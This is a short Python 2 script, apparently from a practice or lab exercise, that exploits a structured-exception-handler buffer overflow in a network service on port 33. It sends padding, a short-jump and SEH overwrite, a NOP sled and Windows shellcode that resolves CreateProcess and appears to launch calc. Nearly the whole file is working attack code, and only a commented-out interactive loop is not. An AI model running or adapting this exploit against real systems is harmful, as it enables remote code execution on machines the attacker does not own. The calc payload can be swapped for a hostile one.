import os
import sys
import socket

ip = sys.argv[1]
socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
socket.connect((ip , 33))

evil = "A"* 330
nseh = "\xeb\x06\x90\x90"
seh = "\xdb\x65\x41\x00" #004165db
nops = "\x90"*100
shellcode = ("\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
        "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
        "\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
        "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
        "\x57\x78\x01\xc2\x8b\x7a\x20\x01"
        "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
        "\x45\x81\x3e\x43\x72\x65\x61\x75"
        "\xf2\x81\x7e\x08\x6f\x63\x65\x73"
        "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
        "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
        "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
        "\xb1\xff\x53\xe2\xfd\x68\x63\x61"
        "\x6c\x63\x89\xe2\x52\x52\x53\x53"
        "\x53\x53\x53\x53\x52\x53\xff\xd7")
payload = evil + nseh + seh + nops + shellcode
socket.send(payload)
d = socket.recv(1024)
print d

# Could not get this to work to know normal functionaility. Just going off of working exploit instead.
# while True:
# 	text = raw_input("input: ")
# 	socket.send(text)
# 	data = socket.recv(1024)
# 	print(data)
# 	if text == "exit":
# 		socket.close()
# 		exit()